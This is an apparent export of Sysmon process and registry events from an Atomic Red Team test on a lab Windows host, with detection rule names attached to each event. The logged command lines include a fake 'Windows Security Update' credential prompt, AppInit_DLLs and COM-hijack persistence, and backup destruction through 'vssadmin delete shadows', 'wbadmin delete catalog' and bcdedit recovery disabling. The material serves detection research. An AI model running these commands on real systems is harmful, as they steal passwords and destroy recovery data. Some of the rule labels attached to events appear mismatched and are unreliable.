2019-07-19T14:46:19.484316+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3619,MSEDGEWIN10,"Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
RuleName: ''
Description: Microsoft .NET Services Installation Utility
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=7D163D3FA313FC69F2510168EFC1240993AAF7D2,MD5=D15EF1C50607B320C31B5697AD126660,SHA256=549CBF63163B33A1CAD7703D4C8A1EF66EEDFFF249A7ECB181C5D2BD78DA2899,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 1060
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7BB-5D31-0000-0010D5092A00
CommandLine: '""C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe"" T1121.dll'
FileVersion: '4.7.3190.0 built by: NET472REL1LAST_C'
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:46:19.479
"
2019-07-19T14:46:20.767102+00:00,Potential Persistence Using DebugPath,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3620,MSEDGEWIN10,"Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe
TargetObject: HKCR\WOW6432Node\CLSID\{17C7DA62-8517-3DF1-A67C-BD4BCD2C5C3F}\InprocServer32\(Default)
RuleName: Persistence - COM Hijack
EventType: SetValue
ProcessId: 1060
ProcessGuid: 747F3D96-D7BB-5D31-0000-0010D5092A00
UtcTime: 2019-07-19 14:46:20.729
Details: mscoree.dll
"
2019-07-19T14:46:51.883827+00:00,HackTool - Covenant PowerShell Launcher;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3630,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4256
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7DB-5D31-0000-001089A52A00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""powershell.exe -command { = System.Management.Automation.Internal.Host.InternalHost.UI.PromptForCredential(''Windows Security Update'', '''',[Environment]::UserName, [Environment]::UserDomainName); echo .GetNetworkCredential().Password;}""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:46:51.871
"
2019-07-19T14:46:51.957887+00:00,HackTool - Covenant PowerShell Launcher;Hacktool - EDR-Freeze Execution;Non Interactive PowerShell Process Spawned;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3631,MSEDGEWIN10,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
Description: Windows PowerShell
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""powershell.exe -command { = System.Management.Automation.Internal.Host.InternalHost.UI.PromptForCredential(''Windows Security Update'', '''',[Environment]::UserName, [Environment]::UserDomainName); echo .GetNetworkCredential().Password;}""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4256
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=6CBCE4A295C163791B60FC23D285E6D84F28EE4C,MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: 747F3D96-D7DB-5D31-0000-001089A52A00
ProcessId: 4452
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7DB-5D31-0000-0010B5A82A00
CommandLine: powershell.exe  -command { = System.Management.Automation.Internal.Host.InternalHost.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); echo .GetNetworkCredential().Password;}
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:46:51.935
"
2019-07-19T14:47:21.972037+00:00,CurrentControlSet Autorun Keys Modification,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3632,MSEDGEWIN10,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\Lsa\Notification Packages
RuleName: Persistence or CredAccess - Lsa NotificationPackge
EventType: SetValue
ProcessId: 3912
ProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
UtcTime: 2019-07-19 14:47:21.917
Details: Binary Data
"
2019-07-19T14:47:37.096237+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3633,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 3968
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D809-5D31-0000-00100A242B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg.exe import c:\AtomicRedTeam\atomics\T1103\T1103.reg""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:47:37.083
"
2019-07-19T14:47:37.127263+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3634,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg.exe import c:\AtomicRedTeam\atomics\T1103\T1103.reg""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3968
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D809-5D31-0000-00100A242B00
ProcessId: 6056
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D809-5D31-0000-00105C262B00
CommandLine: reg.exe  import c:\AtomicRedTeam\atomics\T1103\T1103.reg
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:47:37.116
"
2019-07-19T14:47:37.147054+00:00,CurrentVersion NT Autorun Keys Modification;New DLL Added to AppInit_DLLs Registry Key,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3635,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
RuleName: Persistence - AppInit
EventType: SetValue
ProcessId: 6056
ProcessGuid: 747F3D96-D809-5D31-0000-00105C262B00
UtcTime: 2019-07-19 14:47:37.136
Details: C:\Tools\MessageBox64.dll,C:\Tools\MessageBox32.dll
"
2019-07-19T14:47:37.168863+00:00,CurrentVersion NT Autorun Keys Modification;Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3636,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs
RuleName: Persistence - via Windows Load
EventType: SetValue
ProcessId: 6056
ProcessGuid: 747F3D96-D809-5D31-0000-00105C262B00
UtcTime: 2019-07-19 14:47:37.136
Details: DWORD (0x00000001)
"
2019-07-19T14:47:37.215704+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3637,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 980
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D809-5D31-0000-001072292B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:47:37.170
"
2019-07-19T14:47:40.691438+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3638,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6896
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D80C-5D31-0000-0010223C2B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""vssadmin.exe delete shadows /all /quiet""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:47:40.568
"
2019-07-19T14:47:40.706040+00:00,Hacktool - EDR-Freeze Execution;Shadow Copies Deletion Using Operating Systems Utilities;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3639,MSEDGEWIN10,"Image: C:\Windows\System32\vssadmin.exe
RuleName: ''
Description: 'Command Line Interface for Microsoft® Volume Shadow Copy Service '
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""vssadmin.exe delete shadows /all /quiet""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6896
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=AC561205CD59BBCDB158525978FF65BDF17FDC3C,MD5=614B5C4238977130AA2270C8AD58CE6C,SHA256=D7577FB88CCA3169C7931DC0D8EC9A444227DC14F6C71D6D39D86A0C5CAD1976,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE
ParentProcessGuid: 747F3D96-D80C-5D31-0000-0010223C2B00
ProcessId: 1124
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D80C-5D31-0000-0010843F2B00
CommandLine: vssadmin.exe  delete shadows /all /quiet
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:47:40.596
"
2019-07-19T14:47:40.863055+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3640,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 1348
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D80C-5D31-0000-001005542B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:47:40.849
"
2019-07-19T14:47:45.585327+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3641,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4500
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D811-5D31-0000-001000632B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""wbadmin.exe delete catalog -quiet""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:47:45.569
"
2019-07-19T14:47:45.624944+00:00,Hacktool - EDR-Freeze Execution;Shadow Copies Deletion Using Operating Systems Utilities;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3642,MSEDGEWIN10,"Image: C:\Windows\System32\wbadmin.exe
RuleName: ''
Description: Command Line Interface for Microsoft® BLB Backup
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""wbadmin.exe delete catalog -quiet""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4500
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=F13357EF9B8FB26E8DDDFDBD833194B335EFD88D,MD5=063E992231AC66ABD61E3188A27EC8CB,SHA256=3F31A25ABBF5E75F49C2B596034BA12F95D92FE5AC06D62F15995AF8499908EF,IMPHASH=D72A8A096458529EDF54E67F5F212651
ParentProcessGuid: 747F3D96-D811-5D31-0000-001000632B00
ProcessId: 6160
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D811-5D31-0000-001061652B00
CommandLine: wbadmin.exe  delete catalog -quiet
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:47:45.603
"
2019-07-19T14:47:45.773400+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3643,MSEDGEWIN10,"Image: C:\Windows\System32\wbengine.exe
RuleName: ''
Description: Microsoft® Block Level Backup Engine Service EXE
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\services.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 572
LogonGuid: 747F3D96-D4A4-5D31-0000-0020E7030000
Hashes: SHA1=9E859932DE99CF2D589EFF77DA6BD892D5444380,MD5=CD9EA97E282A5229E66202312DC021BB,SHA256=E05CD6D7AEA164BFC9C258052A63B4A214833B0D3AA4AF89F171DFF19AD3CDA1,IMPHASH=D5A2B84D352AA4650498C09CF2F108A8
ParentProcessGuid: 747F3D96-D4A4-5D31-0000-00100F520000
ProcessId: 6064
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-D811-5D31-0000-0010726A2B00
CommandLine: '""C:\Windows\system32\wbengine.exe""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\services.exe
UtcTime: 2019-07-19 14:47:45.739
"
2019-07-19T14:47:45.958874+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3644,MSEDGEWIN10,"Image: C:\Windows\System32\vds.exe
RuleName: ''
Description: Virtual Disk Service
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\services.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 572
LogonGuid: 747F3D96-D4A4-5D31-0000-0020E7030000
Hashes: SHA1=EEFD84BCBB943CDD21B292FA5F5A811E3C4CC711,MD5=E845A556FC6574216078A02FE53189C1,SHA256=9CECFC7977BAA23A840F987A28813227BAB3F2DFDF1D571B51327107B5AA8CE2,IMPHASH=E2F880E899B5A451B9B030D7BCFA2EAE
ParentProcessGuid: 747F3D96-D4A4-5D31-0000-00100F520000
ProcessId: 3184
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-D811-5D31-0000-0010147C2B00
CommandLine: C:\Windows\System32\vds.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\services.exe
UtcTime: 2019-07-19 14:47:45.940
"
2019-07-19T14:47:46.112439+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3645,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 2948
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D812-5D31-0000-0010AC892B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:47:46.104
"
2019-07-19T14:47:51.816821+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3647,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6508
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D817-5D31-0000-001064AD2B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:47:51.784
"
2019-07-19T14:47:51.865963+00:00,Boot Configuration Tampering Via Bcdedit.EXE;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3648,MSEDGEWIN10,"Image: C:\Windows\System32\bcdedit.exe
RuleName: ''
Description: Boot Configuration Data Editor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6508
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=AA1B1FDD00B453CFC690357F5AF930EE6D4C19BB,MD5=7BCA6114F94639C9DAAB4BA4E668FBD0,SHA256=1ADEA035FBFF2FC188FF4CD27076BED9E03DB5ECEFFBD59F875A2A1FEEFB16F0,IMPHASH=2137581C3B28D7B500B0C8EB08EE2057
ParentProcessGuid: 747F3D96-D817-5D31-0000-001064AD2B00
ProcessId: 396
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D817-5D31-0000-001097B02B00
CommandLine: bcdedit.exe  /set {default} bootstatuspolicy ignoreallfailures
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:47:51.844
"
2019-07-19T14:47:51.997980+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3649,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6216
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D817-5D31-0000-001049B42B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bcdedit.exe /set {default} recoveryenabled no""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:47:51.899
"
2019-07-19T14:47:52.010791+00:00,Boot Configuration Tampering Via Bcdedit.EXE;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3650,MSEDGEWIN10,"Image: C:\Windows\System32\bcdedit.exe
RuleName: ''
Description: Boot Configuration Data Editor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bcdedit.exe /set {default} recoveryenabled no""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6216
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=AA1B1FDD00B453CFC690357F5AF930EE6D4C19BB,MD5=7BCA6114F94639C9DAAB4BA4E668FBD0,SHA256=1ADEA035FBFF2FC188FF4CD27076BED9E03DB5ECEFFBD59F875A2A1FEEFB16F0,IMPHASH=2137581C3B28D7B500B0C8EB08EE2057
ParentProcessGuid: 747F3D96-D817-5D31-0000-001049B42B00
ProcessId: 5984
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D817-5D31-0000-0010B7B62B00
CommandLine: bcdedit.exe  /set {default} recoveryenabled no
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:47:51.927
"
